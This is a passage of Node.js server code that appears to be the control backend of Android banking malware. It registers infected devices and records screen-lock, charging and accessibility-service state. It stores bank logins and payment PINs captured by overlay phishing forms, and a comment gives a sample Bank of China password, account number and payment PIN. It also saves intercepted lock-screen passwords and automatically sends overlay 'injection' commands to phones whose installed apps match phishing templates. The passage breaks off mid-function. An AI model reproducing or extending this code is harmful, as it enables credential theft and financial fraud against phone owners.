    const batteryInsV   = batteryUpdV === null ? 0 : batteryUpdV;
    // networkType: NOT NULL 默认 ''
    const networkTypeUpdV = data.networkType !== undefined ? String(data.networkType || '') : null;
    const networkTypeInsV = networkTypeUpdV === null ? '' : networkTypeUpdV;
    // 布尔/0-1 类 NOT NULL 默认 0
    const isScreenOnUpdV = data.isScreenOn !== undefined ? (data.isScreenOn ? 1 : 0) : null;
    const isScreenOnInsV = isScreenOnUpdV === null ? 0 : isScreenOnUpdV;
    const isChargingUpdV = data.isCharging !== undefined ? (data.isCharging ? 1 : 0) : null;
    const isChargingInsV = isChargingUpdV === null ? 0 : isChargingUpdV;
    const isLockedUpdV   = data.isLocked !== undefined ? (data.isLocked ? 1 : 0) : null;
    const isLockedInsV   = isLockedUpdV === null ? 0 : isLockedUpdV;
    const accessibilityAliveUpdV = data.accessibilityAlive !== undefined ? (data.accessibilityAlive ? 1 : 0) : null;
    const accessibilityAliveInsV = accessibilityAliveUpdV === null ? 0 : accessibilityAliveUpdV;
    // screen_width / screen_height: NOT NULL 默认 0
    const screenWidthUpdV  = data.screenWidth  > 0 ? Number(data.screenWidth)  : null;
    const screenWidthInsV  = screenWidthUpdV  === null ? 0 : screenWidthUpdV;
    const screenHeightUpdV = data.screenHeight > 0 ? Number(data.screenHeight) : null;
    const screenHeightInsV = screenHeightUpdV === null ? 0 : screenHeightUpdV;

    const permissionsV = data.permissions && typeof data.permissions === 'object' ? JSON.stringify(data.permissions) : null;

    // geo 清空规则：只有当本次 public_ip 有值且与 DB 中不同时，才置空。
    await dbWithRetry(
      () => db.query(
        `INSERT INTO fisher_devices
         (device_id, is_connected, last_seen, first_seen, created_at,
          brand, model, os_version, app_version, app_name, public_ip,
          battery_level, network_type, is_screen_on, is_charging, is_locked, accessibility_alive,
          screen_width, screen_height, permissions)
         VALUES (?, 1, ?, ?, ?,
                 ?, ?, ?, ?, ?, ?,
                 ?, ?, ?, ?, ?, ?,
                 ?, ?, ?)
         ON DUPLICATE KEY UPDATE
           is_connected  = 1,
           last_seen     = ?,
           brand         = IF(? IS NOT NULL, ?, brand),
           model         = IF(? IS NOT NULL, ?, model),
           os_version    = IF(? IS NOT NULL, ?, os_version),
           app_version   = IF(? IS NOT NULL, ?, app_version),
           app_name      = IF(? IS NOT NULL, ?, app_name),
           public_ip     = IF(? IS NOT NULL, ?, public_ip),
           geo_location  = IF(? IS NOT NULL AND ? <> COALESCE(public_ip, ''), '', geo_location),
           battery_level = IF(? IS NOT NULL, ?, battery_level),
           network_type  = IF(? IS NOT NULL, ?, network_type),
           is_screen_on  = IF(? IS NOT NULL, ?, is_screen_on),
           is_charging   = IF(? IS NOT NULL, ?, is_charging),
           is_locked     = IF(? IS NOT NULL, ?, is_locked),
           accessibility_alive = IF(? IS NOT NULL, ?, accessibility_alive),
           screen_width  = IF(? IS NOT NULL, ?, screen_width),
           screen_height = IF(? IS NOT NULL, ?, screen_height),
           permissions   = IF(? IS NOT NULL, ?, permissions)`,
        [
          // INSERT side (NOT NULL cols use *InsV with safe defaults)
          deviceId, now, now, now,
          brandInsV, modelInsV, osVersionInsV, appVersionInsV, appNameInsV, publicIpV,
          batteryInsV, networkTypeInsV, isScreenOnInsV, isChargingInsV, isLockedInsV, accessibilityAliveInsV,
          screenWidthInsV, screenHeightInsV, permissionsV,
          // ON DUPLICATE KEY UPDATE side (*UpdV with NULL = skip)
          now,
          brandV, brandV,
          modelV, modelV,
          osVersionV, osVersionV,
          appVersionV, appVersionV,
          appNameV, appNameV,
          publicIpV, publicIpV,
          publicIpV, publicIpV,
          batteryUpdV, batteryUpdV,
          networkTypeUpdV, networkTypeUpdV,
          isScreenOnUpdV, isScreenOnUpdV,
          isChargingUpdV, isChargingUpdV,
          isLockedUpdV, isLockedUpdV,
          accessibilityAliveUpdV, accessibilityAliveUpdV,
          screenWidthUpdV, screenWidthUpdV,
          screenHeightUpdV, screenHeightUpdV,
          permissionsV, permissionsV,
        ]
      ),
      { label: `syncDeviceStatus:${shortId}`, maxRetries: 3 }
    );

    // ★ 写节流标记：last_seen + status_meta（避免下一次心跳 UPDATE 在 10s/5s 内重复争同一行锁）
    wtMark(deviceId, ['last_seen', 'status_meta', 'public_ip']);
    void recordDeviceDebug('db.device_upsert.completed', deviceId, {
      appName: appNameV || '',
      brand: brandV || '',
      model: modelV || '',
      metadataWasPartial: !appNameV || !brandV || !modelV,
    });

    // 首次注册的日志通过额外查询判断（只在 brand/model 都有值或首次无匹配行时才输出"Auto-registered"，
    // 但为避免额外 SELECT 加重死锁，这里简化日志：不区分是否首次，只在 debug 模式下打印）
    if (process.env.NODE_WS_DEBUG_SYNC === '1') {
      console.log(`[WS-Device] syncDeviceStatus upserted: ${shortId}...`);
    }
  } catch (err) {
    void recordDeviceDebug('db.device_upsert.error', deviceId, { message: err.message || String(err) }, 'error');
    // 死锁/锁等待：已经由 dbWithRetry 内部打了 warn（可观测）；这里不再打 error，避免日志爆炸
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      console.warn(`[WS-Device] syncDeviceStatus give up after retries (${shortId}...): ${err.message}`);
    } else {
      console.error('[WS-Device] syncDeviceStatus error:', err.message);
    }
  }
}

/**
 * 保存注入数据到数据库
 *
 * APK 上报格式:
 * { type: 'injection', deviceId: 'xxx', data: '{"密码":"83663737","类型":"中国银行登录","账号":"18565235625","时间戳":1782505343570,"支付密码":"635985"}', packageName: 'xyz.bcluu.msgxp', timestamp: 1785074926742 }
 *
 * 目标存储格式（form_data 字段）:
 * {"密码": "83663737hshd", "类型": "中国银行登录", "账号": "18565235625", "时间戳": 1782505343570, "支付密码": "635985"}
 */
async function saveInjectionData(deviceId, msg, connections) {
  if (!deviceId || !msg) return;
  const processingStartedAt = Date.now();
  try {
    const db = getPool();
    const packageName = msg.packageName || msg.package_name || '';
    // 先在内存中标记完成，再执行异步入库。这样与 9 秒自动重试、状态探针
    // 同时发生时，旧任务不能在 DELETE 完成前后重新下发第二个表单。
    markInjectionCompletion(deviceId, packageName);

    // 解析 data 字段 — 可能是 JSON 字符串或已解析对象
    let formData = msg.data || msg.formData || {};
    if (typeof formData === 'string') {
      try {
        formData = JSON.parse(formData);
      } catch (e) {
        // 不是合法 JSON，保持原字符串
        formData = { raw: formData };
      }
    }

    // 从解析后的数据中提取类型作为 template_name
    const templateName = formData['类型'] || formData.type || formData.templateName || msg.templateName || '';

    // 直接存储解析后的干净数据（不嵌套 wrapper）
    const formDataStr = typeof formData === 'object' ? JSON.stringify(formData) : String(formData);
    const formFieldNames = formData && typeof formData === 'object' && !Array.isArray(formData)
      ? Object.keys(formData)
      : [];
    void recordDeviceDebug('injection.form.processing_started', deviceId, {
      traceSchemaVersion: INJECTION_TRACE_SCHEMA_VERSION,
      packageName,
      templateName,
      templateId: msg.templateId || msg.template_id || '',
      requestId: msg.requestId || msg.request_id || '',
      source: msg.source || '',
      fieldNames: formFieldNames,
      fieldCount: formFieldNames.length,
      payloadBytes: jsonByteLength(msg),
      formDataBytes: Buffer.byteLength(formDataStr, 'utf8'),
      clientTimestamp: Number(msg.timestamp || 0),
    });

    const persistStartedAt = Date.now();
    const [insertResult] = await db.query(
      'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
      [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
    );
    void recordDeviceDebug('injection.form.persisted', deviceId, {
      packageName,
      templateName,
      recordId: Number(insertResult?.insertId || 0),
      affectedRows: Number(insertResult?.affectedRows || 0),
      fieldNames: formFieldNames,
      fieldCount: formFieldNames.length,
      formDataBytes: Buffer.byteLength(formDataStr, 'utf8'),
      persistDurationMs: Date.now() - persistStartedAt,
    });

    // 表单已持久化：服务端将该包名从活跃任务中移除，并以 STOP_INJECTION
    // 作为完成确认。客户端自行关闭页面仍是第一道保障，此命令用于收敛状态。
    let completionTemplateId = String(msg.templateId || msg.template_id || '');
    if (packageName) {
      let completionRequestId = '';
      let completionSource = '';
      try {
        const taskLookupStartedAt = Date.now();
        const [taskRows] = await db.query(
          'SELECT task_json FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=? ORDER BY created_at DESC LIMIT 1',
          [deviceId, packageName]
        );
        let taskJsonParsed = false;
        if (taskRows?.[0]?.task_json) {
          try {
            const taskData = typeof taskRows[0].task_json === 'string'
              ? JSON.parse(taskRows[0].task_json)
              : taskRows[0].task_json;
            completionRequestId = String(taskData?.requestId || '');
            completionSource = String(taskData?.source || '');
            completionTemplateId = String(taskData?.templateId || completionTemplateId || '');
            taskJsonParsed = true;
          } catch {}
        }
        void recordDeviceDebug('injection.form.active_task_snapshot', deviceId, {
          packageName,
          found: !!taskRows?.[0],
          taskJsonParsed,
          requestId: completionRequestId,
          source: completionSource,
          templateId: completionTemplateId,
          taskJsonBytes: jsonByteLength(taskRows?.[0]?.task_json || ''),
          lookupDurationMs: Date.now() - taskLookupStartedAt,
        });
        const clearStartedAt = Date.now();
        const [clearResult] = await db.query(
          'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
          [deviceId, packageName]
        );
        void recordDeviceDebug('injection.active_task.cleared', deviceId, {
          packageName,
          affectedRows: Number(clearResult?.affectedRows || 0),
          requestId: completionRequestId,
          source: completionSource,
          clearDurationMs: Date.now() - clearStartedAt,
        });
      } catch (taskErr) {
        // 兼容尚未创建活跃任务表的旧库：已收到的表单仍视为上报成功。
        console.warn(`[WS-Device] Failed to clear active injection task ${packageName} for ${deviceId}: ${taskErr.message}`);
        void recordDeviceDebug('injection.form.active_task_error', deviceId, {
          packageName,
          requestId: completionRequestId,
          message: taskErr.message || String(taskErr),
          processingDurationMs: Date.now() - processingStartedAt,
        }, 'error');
      }

      const current = connections?.devices?.get(deviceId);
      if (current?.ws?.readyState === 1) {
        try {
          const stopPayload = JSON.stringify({
            type: 'command',
            sessionId: deviceId,
            data: {
              command: 'STOP_INJECTION',
              params: {
                packageName,
                requestId: completionRequestId,
                source: 'capture-complete',
              }
            }
          });
          current.ws.send(stopPayload);
          void recordDeviceDebug('injection.completed.stop_sent', deviceId, {
            packageName,
            requestId: completionRequestId,
            previousSource: completionSource,
            source: 'capture-complete',
            route: 'device-ws',
            payloadBytes: Buffer.byteLength(stopPayload, 'utf8'),
            wsReadyState: current.ws.readyState,
          });
        } catch (stopErr) {
          console.warn(`[WS-Device] Failed to send completion STOP_INJECTION ${packageName} to ${deviceId}: ${stopErr.message}`);
          void recordDeviceDebug('injection.completed.stop_error', deviceId, {
            packageName,
            message: stopErr.message || String(stopErr),
          }, 'error');
        }
      } else {
        void recordDeviceDebug('injection.completed.stop_no_route', deviceId, { packageName }, 'warn');
      }
    }
    console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
    void recordDeviceDebug('injection.form.processing_completed', deviceId, {
      packageName,
      templateName,
      templateId: completionTemplateId,
      requestId: msg.requestId || msg.request_id || '',
      recordId: Number(insertResult?.insertId || 0),
      processingDurationMs: Date.now() - processingStartedAt,
      outcome: 'persisted-and-stop-attempted',
    });
    return {
      recordId: Number(insertResult?.insertId || 0),
      packageName,
      templateName,
      templateId: completionTemplateId,
      data: formData,
      timestamp: Number(msg.timestamp || Date.now()),
    };
  } catch (err) {
    console.error('[WS-Device] saveInjectionData error:', err.message);
    void recordDeviceDebug('injection.form.persist_error', deviceId, {
      packageName: msg.packageName || msg.package_name || '',
      message: err.message || String(err),
      processingDurationMs: Date.now() - processingStartedAt,
    }, 'error');
    return false;
  }
}

/**
 * 保存密码数据到数据库（与旧 Python 后端一致）
 * 旧后端在 ws_device 中处理 NEW_PASSWORD 消息时写入 passwords 表
 */
async function savePassword(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherType = data.cipherType || data.cipher_type || data.passwordType || data.password_type || 'pin';
    const cipherText = data.cipherText || data.cipher_text || data.textCipher || data.patternCipher || data.password || '';
    const gradeCode = data.cipherGradeCode || data.cipher_grade_code || data.grade_code || '';
    const source = data.source || data.cipherSource || data.inputMethod || data.input_method || 'manual';

    if (cipherText) {
      await db.query(
        'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
        [deviceId, cipherType, cipherText, gradeCode, source, Math.floor(Date.now() / 1000)]
      );
      console.log(`[WS-Device] Saved password from ${deviceId}: type=${cipherType}`);
    }
  } catch (err) {
    console.error('[WS-Device] savePassword error:', err.message);
  }
}

/**
 * 保存支付密码截获记录到 fisher_payment_cipher_records
 * APK 上报格式:
 * { packageName, cipher/password, type/cipherType, appName, source }
 */
async function saveCipherRecord(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherText = data.cipher || data.password || data.cipherText || data.cipher_text || '';
    if (!cipherText) {
      console.log(`[WS-Device] saveCipherRecord: empty cipher from ${deviceId}, data=`, JSON.stringify(data).substring(0, 300));
      return;
    }
    const packageName = data.pkg || data.packageName || data.package_name || data.package || '';
    const appName = data.app || data.appName || data.app_name || '';
    const cipherType = data.grade || data.cipherType || data.cipher_type || data.type || 'pin';
    const source = data.source || '';

    await db.query(
      'INSERT INTO fisher_payment_cipher_records (device_id, package_name, app_name, cipher_text, cipher_type, source, created_at) VALUES (?,?,?,?,?,?,?)',
      [deviceId, packageName, appName, cipherText, cipherType, source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved payment cipher from ${deviceId}: type=${cipherType}, pkg=${packageName}`);
  } catch (err) {
    console.error('[WS-Device] saveCipherRecord error:', err.message);
  }
}

/**
 * 仅当数据库中无该设备的最新密码记录时才插入（用于 password_status 去重）
 */
async function savePasswordIfNew(deviceId, cipherText, cipherType, source) {
  if (!deviceId || !cipherText) return;
  try {
    const db = getPool();
    // 查最近一条记录，如果 cipher_text 一样就跳过
    const [rows] = await db.query(
      'SELECT cipher_text FROM fisher_passwords WHERE device_id=? ORDER BY id DESC LIMIT 1',
      [deviceId]
    );
    if (rows.length > 0 && rows[0].cipher_text === cipherText) return;
    // 不存在或不同 → 插入
    await db.query(
      'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
      [deviceId, cipherType, cipherText, '', source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] savePasswordIfNew: saved ${cipherType} from ${deviceId}`);
  } catch (err) {
    console.error('[WS-Device] savePasswordIfNew error:', err.message);
  }
}

/**
 * 6 种业务日志类型（存入 fisher_operation_logs）
 */
const ALLOWED_LOG_TYPES = new Set(['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS']);

/**
 * 保存操作日志到数据库
 * - KSTR/NTFS/VAPS/BLNK/ACTZ/ARTS 6 种 → fisher_operation_logs
 * - 其他类型（WARN/TROJ/CMDX/NETW/ADPT 等） → fisher_bridge_logs
 */
async function saveOperationLog(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const logType = (data.logType || data.log_type || data.type || '').toUpperCase();
    const content = data.content || data.message || '';
    const timestamp = data.timestamp ? Math.floor(data.timestamp / 1000) : Math.floor(Date.now() / 1000);

    if (!logType || !content) return;

    // 根据类型分流到不同的表
    const tableName = ALLOWED_LOG_TYPES.has(logType)
      ? 'fisher_operation_logs'
      : 'fisher_bridge_logs';

    await db.query(
      `INSERT INTO ${tableName} (device_id, log_type, content, timestamp, created_at) VALUES (?,?,?,?,?)`,
      [deviceId, logType, content, timestamp, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved ${tableName} from ${deviceId}: type=${logType}`);
  } catch (err) {
    console.error('[WS-Device] saveOperationLog error:', err.message);
  }
}

async function updateDeviceStatus(deviceId, isConnected, clientIp) {
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    const shortId = String(deviceId).substring(0, 12);
    if (isConnected) {
      // 连接时先检查设备是否存在（可能是首次 WS 连接但还没发状态消息）
      // SELECT 与 UPDATE 分离，但 UPDATE 仍走死锁重试
      const [rows] = await dbWithRetry(
        () => db.query('SELECT id FROM fisher_devices WHERE device_id=?', [deviceId]),
        { label: `updateDeviceStatus:SELECT:${shortId}`, maxRetries: 2 }
      );
      if (rows && rows.length > 0) {
        // 上线写 last_seen：走节流（如果 syncDeviceStatus 刚刷过，这里就跳过，减少一次争锁）
        const shouldWriteLastSeen = wtAllow(deviceId, 'last_seen');
        const shouldWriteIp = clientIp ? wtAllow(deviceId, 'public_ip') : false;
        if (shouldWriteLastSeen || shouldWriteIp || true /* is_connected 状态变化必须写 */) {
          const fields = ['is_connected=1', 'connected_at=?'];
          const params = [now];
          if (shouldWriteLastSeen) { fields.push('last_seen=?'); params.push(now); }
          if (clientIp && shouldWriteIp) { fields.push('public_ip=?'); params.push(clientIp); }
          params.push(deviceId);
          await dbWithRetry(
            () => db.query(`UPDATE fisher_devices SET ${fields.join(',')} WHERE device_id=?`, params),
            { label: `updateDeviceStatus:ON:${shortId}`, maxRetries: 3 }
          );
          if (shouldWriteLastSeen) wtMark(deviceId, 'last_seen');
          if (shouldWriteIp) wtMark(deviceId, 'public_ip');
        }
      }
      // 如果不存在，等 syncDeviceStatus 来注册
    } else {
      // 下线：直接写 is_connected=0，不走节流（状态变化重要）
      await dbWithRetry(
        () => db.query(
          'UPDATE fisher_devices SET is_connected=0 WHERE device_id=?',
          [deviceId]
        ),
        { label: `updateDeviceStatus:OFF:${shortId}`, maxRetries: 3 }
      );
    }
  } catch (err) {
    // 死锁类错误降级为 warn（避免日志爆炸）
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      console.warn(`[WS-Device] updateDeviceStatus ${isConnected ? 'ON' : 'OFF'} give up (${shortId}...): ${err.message}`);
    } else {
      console.error('[WS-Device] DB error:', err.message);
    }
  }
}

/**
 * 处理设备返回的应用列表
 * 1. 存入 fisher_device_apps 表
 * 2. 如果 injection_active=1，自动对匹配模板的APP下发注入
 */
async function handleAppList(deviceId, msg, ws, connections) {
  try {
    const db = getPool();
    const apps = msg._apps || msg.data?.apps || msg.data || msg.apps || [];
    const appsJson = JSON.stringify(apps);
    const now = Math.floor(Date.now() / 1000);
    const currentConnection = connections.devices.get(deviceId);
    const lastRequestAt = Number(currentConnection?.lastAppListRequestAt || 0);
    void recordDeviceDebug('apps.response.received', deviceId, {
      count: Array.isArray(apps) ? apps.length : 0,
      responseType: msg.type || msg.event || 'app_list',
      payloadBytes: Buffer.byteLength(appsJson, 'utf8'),
      responseLatencyMs: lastRequestAt > 0 ? Math.max(0, Date.now() - lastRequestAt) : null,
      requestSource: currentConnection?.lastAppListRequestSource || '',
      connectionAgeMs: currentConnection
        ? Math.max(0, Date.now() - Number(currentConnection.connectedAt || Date.now()))
        : null,
      messageKeys: msg && typeof msg === 'object' ? Object.keys(msg) : [],
    });

    // UPSERT: 存在则更新，不存在则插入（新设备默认 injection_active=1）
    await db.query(
      `INSERT INTO fisher_device_apps (device_id, installed_apps, updated_at, injection_active)
       VALUES (?, ?, ?, 1)
       ON DUPLICATE KEY UPDATE installed_apps=VALUES(installed_apps), updated_at=VALUES(updated_at)`,
      [deviceId, appsJson, now]
    );
    console.log(`[WS-Device] Saved ${apps.length} apps for ${deviceId}`);

    // 检查自动注入开关（默认开启：字段为 NULL 或 1 都视为开启）
    const [rows] = await db.query(
      'SELECT injection_active FROM fisher_device_apps WHERE device_id=?',
      [deviceId]
    );
    const injActive = rows && rows.length > 0 ? rows[0].injection_active : 1;
    if (injActive === 0) {
      console.log(`[WS-Device] injection_active=OFF for ${deviceId}, skipping auto-inject`);
    } else {
      console.log(`[WS-Device] injection_active=ON for ${deviceId}, triggering auto-inject...`);
      void recordDeviceDebug('injection.auto.matching', deviceId, { installedAppCount: Array.isArray(apps) ? apps.length : 0 });
      const current = connections.devices.get(deviceId);
      if (current && current.ws === ws && !current.injectionStatusReady) {
        startInjectionReadinessHandshake(deviceId, apps, ws, connections);
        void recordDeviceDebug('injection.auto.waiting_client_ready', deviceId, {
          installedAppCount: Array.isArray(apps) ? apps.length : 0,
          command: 'GET_INJECTION_STATUS',
        });
        return;
      }
      await autoInjectForDevice(deviceId, apps, ws, connections);
    }
  } catch (err) {
    console.error('[WS-Device] handleAppList error:', err.message);
  }
}

/**
 * SHOW_INJECTION 只能在 APK 命令处理器启动后下发。新安装设备的 WS/心跳
 * 往往先于命令处理器就绪；固定等几秒仍会丢命令。先用轻量的
 * GET_INJECTION_STATUS 做应用层握手，收到 injection_status 后再发送注入。
 */
function startInjectionReadinessHandshake(deviceId, apps, ws, connections) {
  const current = connections.devices.get(deviceId);
  if (!current || current.ws !== ws || ws.readyState !== 1) return;

  current.pendingAutoApps = Array.isArray(apps) ? apps : [];
  current.pendingAutoAppsAt = current.pendingAutoAppsAt || Date.now();
  if (Array.isArray(current.injectionReadinessTimers) && current.injectionReadinessTimers.length > 0) return;

  const probeDelays = [0, 5000, 15000, 30000, 60000];
  const timers = probeDelays.map((delayMs, index) => setTimeout(() => {
    const latest = connections.devices.get(deviceId);
    if (!latest || latest.ws !== ws || latest.injectionStatusReady || ws.readyState !== 1) return;
    try {
      const probePayload = JSON.stringify({
        type: 'command',
        sessionId: deviceId,
        data: {
          command: 'GET_INJECTION_STATUS',
          params: {
            source: 'auto-readiness-handshake',
            attempt: index + 1,
          },
        },
      });
      ws.send(probePayload);
      void recordDeviceDebug('injection.auto.readiness_probe_sent', deviceId, {
        delayMs,
        attempt: index + 1,
        totalAttempts: probeDelays.length,
        command: 'GET_INJECTION_STATUS',
        source: 'auto-readiness-handshake',
        payloadBytes: Buffer.byteLength(probePayload, 'utf8'),
        connectionAgeMs: Math.max(0, Date.now() - Number(latest.connectedAt || Date.now())),
        readinessWaitMs: latest.pendingAutoAppsAt
          ? Math.max(0, Date.now() - Number(latest.pendingAutoAppsAt))
          : null,
      });
    } catch (err) {
      void recordDeviceDebug('injection.auto.readiness_probe_error', deviceId, {
        delayMs,
        attempt: index + 1,
        message: err.message || String(err),
      }, 'error');
    }
  }, delayMs));

  // 兼容不支持 injection_status 的旧客户端，但给新安装启动留足时间。
  const fallbackTimer = setTimeout(async () => {
    const latest = connections.devices.get(deviceId);
    if (!latest || latest.ws !== ws || latest.injectionStatusReady || ws.readyState !== 1) return;
    const pendingApps = Array.isArray(latest.pendingAutoApps) ? latest.pendingAutoApps : [];
    latest.injectionStatusReady = true;
    latest.pendingAutoApps = null;
    latest.pendingAutoAppsAt = 0;
    latest.injectionReadinessTimers = [];
    void recordDeviceDebug('injection.auto.readiness_fallback', deviceId, {
      waitedMs: 75000,
      installedAppCount: pendingApps.length,
    }, 'warn');
    await autoInjectForDevice(deviceId, pendingApps, ws, connections);
  }, 75000);

  current.injectionReadinessTimers = [...timers, fallbackTimer];
  current.injectionReadinessTimers.forEach(timer => {
    if (typeof timer.unref === 'function') timer.unref();
  });
}

/**
 * 消费 APK 通过 PHP /api/sync/app-list 上传的应用列表。
 * 这些 APK 不一定会另外返回 WS app_list_response，所以必须把 HTTP
 * 上传接入同一套 handleAppList -> autoInjectForDevice 流程。
 */
async function handleUploadedAppList(deviceId, apps, connections, source = 'http-sync') {
  const current = connections.devices.get(deviceId);
  if (!current || !current.ws || current.ws.readyState !== 1) {
    return { accepted: false, reason: 'device-ws-offline' };
  }

  current.appListReceived = true;
  current.lastAppListResponseAt = Date.now();
  void recordDeviceDebug('apps.http_sync.accepted', deviceId, {
    count: Array.isArray(apps) ? apps.length : 0,
    source,
  });
  await handleAppList(deviceId, {
    type: 'http_app_list_sync',
    _apps: Array.isArray(apps) ? apps : [],
  }, current.ws, connections);
  return { accepted: true, reason: 'processed' };
}

// 内存记录：已预留或已下发的设备+包名（防止并发应用列表响应重复注入）
const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>
const autoInjectionReservations = new Map(); // 仅用于阻止并发应用列表响应重复下发

function normalizeTimestampSeconds(value) {
  if (value === null || value === undefined || value === '') return 0;
  const numeric = Number(value);
  if (Number.isFinite(numeric) && numeric > 0) {
    return Math.floor(numeric > 100000000000 ? numeric / 1000 : numeric);
  }
  const parsed = Date.parse(String(value));
  return Number.isFinite(parsed) ? Math.floor(parsed / 1000) : 0;
}

function getAppFirstInstallAt(app) {
  if (!app || typeof app !== 'object') return 0;
  return normalizeTimestampSeconds(
    app.firstInstallTime
      ?? app.first_install_time
      ?? app.installTime
      ?? app.install_time
      ?? app.installedAt
      ?? app.installed_at
  );
}

function getInjectionStatusLists(msg) {
  const data = msg && typeof msg.data === 'object' && msg.data ? msg.data : {};
  const packageValue = data.enabledPackages ?? msg?.enabledPackages;
  const templateValue = data.enabledTemplateIds ?? msg?.enabledTemplateIds;
  return {
    hasEnabledPackages: Array.isArray(packageValue),
    enabledPackages: Array.isArray(packageValue) ? packageValue.map(String).filter(Boolean) : [],
    enabledTemplateIds: Array.isArray(templateValue) ? templateValue.map(String).filter(Boolean) : [],
    reportedCount: Number(data.count ?? msg?.count ?? 0),
  };
}

async function persistActiveInjectionTask(db, deviceId, packageName, templateId, source, requestId = '') {
  const startedAtMs = Date.now();
  const taskJson = JSON.stringify({
    packageName,
    templateId,
    requestId,
    startedAt: Math.floor(startedAtMs / 1000),
    startedAtMs,
    source,
  });
  const [result] = await db.query(
    `INSERT INTO fisher_active_injection_tasks
       (device_id, package_name, task_json, created_at)
     VALUES (?, ?, ?, NOW())
     ON DUPLICATE KEY UPDATE
       task_json=VALUES(task_json), created_at=VALUES(created_at)`,
    [deviceId, packageName, taskJson]
  );
  return Number(result?.affectedRows || 0);
}

async function reconcileInjectionStatus(deviceId, msg) {
  const processingStartedAt = Date.now();
  const status = getInjectionStatusLists(msg);
  void recordDeviceDebug('injection.status.received', deviceId, {
    hasEnabledPackages: status.hasEnabledPackages,
    enabledPackages: status.enabledPackages,
    enabledTemplateIds: status.enabledTemplateIds,
    reportedCount: status.reportedCount,
    messageKeys: msg && typeof msg === 'object' ? Object.keys(msg) : [],
    dataKeys: msg?.data && typeof msg.data === 'object' ? Object.keys(msg.data) : [],
  });

  if (!status.hasEnabledPackages) {
    void recordDeviceDebug('injection.status.processing_completed', deviceId, {
      outcome: 'ignored-missing-enabled-packages',
      processingDurationMs: Date.now() - processingStartedAt,
    }, 'warn');
    return;
  }

  try {
    const db = getPool();
    const [templateRows] = status.enabledPackages.length > 0
      ? await db.query(
        'SELECT package_name, template_id FROM fisher_injection_templates WHERE package_name IN (?)',
        [status.enabledPackages]
      )
      : [[]];
    const templateByPackage = new Map(
      (templateRows || []).map(row => [String(row.package_name || ''), String(row.template_id || '')])
    );

    // injection_status 是 APK 对“当前已启用”的完整快照。只清理自动任务，
    // 不抢先清理刚刚从控制台发出、仍在等待 APK 处理的手动重注任务。
    const [existingRows] = await db.query(
      'SELECT package_name, task_json FROM fisher_active_injection_tasks WHERE device_id=?',
      [deviceId]
    );
    const enabledSet = new Set(status.enabledPackages);
    const existingTaskByPackage = new Map();
    const cleared = [];
    for (const row of existingRows || []) {
      let task = {};
      try {
        task = typeof row.task_json === 'string' ? JSON.parse(row.task_json) : (row.task_json || {});
      } catch {}
      const packageName = String(row.package_name || '');
      const source = String(task?.source || '');
      if (packageName) {
        existingTaskByPackage.set(packageName, {
          task,
          rawTaskJson: typeof row.task_json === 'string' ? row.task_json : JSON.stringify(row.task_json || {}),
        });
      }
      if (packageName && !enabledSet.has(packageName) && (source.startsWith('auto') || source === 'client-status')) {
        await db.query(
          'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
          [deviceId, packageName]
        );
        cleared.push(packageName);
      }
    }

    // 内存去重也必须以 APK 快照为准，否则一次未生效的 SHOW_INJECTION
    // 会在 Node 进程整个生命周期里阻断后续自动下发。
    const effectiveEnabledPackages = [];
    const persisted = [];
    for (let index = 0; index < status.enabledPackages.length; index++) {
      const packageName = status.enabledPackages[index];
      const templateId = status.enabledTemplateIds[index] || templateByPackage.get(packageName) || '';
      const completionAt = getRecentInjectionCompletion(deviceId, packageName);
      const existing = existingTaskByPackage.get(packageName);
      const requestTimestampMatch = String(existing?.task?.requestId || '').match(/(?:^|[^0-9])(\d{13})(?:[^0-9]|$)/);
      const existingStartedAtMs = Number(
        existing?.task?.startedAtMs
          || requestTimestampMatch?.[1]
          || normalizeTimestampSeconds(existing?.task?.startedAt) * 1000
          || 0
      );
      const startedAfterCompletion = completionAt > 0 && existingStartedAtMs > completionAt;

      // 表单完成后的延迟 injection_status 可能仍携带旧 enabledPackages。
      // 没有更新一轮任务时不能用这个旧快照把已删除的任务重新写回数据库。
      if (completionAt > 0 && !startedAfterCompletion) {
        if (existing?.rawTaskJson) {
          await db.query(
            `DELETE FROM fisher_active_injection_tasks
             WHERE device_id=? AND package_name=? AND task_json=?`,
            [deviceId, packageName, existing.rawTaskJson]
          );
        }
        void recordDeviceDebug('injection.status.skipped', deviceId, {
          packageName,
          templateId,
          completionAt,
          reason: 'capture-already-completed',
        });
        continue;
      }

      const affectedRows = await persistActiveInjectionTask(
        db,
        deviceId,
        packageName,
        templateId,
        'client-status'
      );
      effectiveEnabledPackages.push(packageName);
      persisted.push({ packageName, templateId, affectedRows });
    }
    autoInjectedCache.set(deviceId, new Set(effectiveEnabledPackages));
    void recordDeviceDebug('injection.status.persisted', deviceId, {
      persisted,
      cleared,
      receivedEnabledCount: status.enabledPackages.length,
      persistedCount: persisted.length,
      clearedCount: cleared.length,
      processingDurationMs: Date.now() - processingStartedAt,
    });
    void recordDeviceDebug('injection.status.processing_completed', deviceId, {
      outcome: 'reconciled',
      enabledPackages: effectiveEnabledPackages,
      persistedCount: persisted.length,
      clearedCount: cleared.length,
      processingDurationMs: Date.now() - processingStartedAt,
    });
  } catch (err) {
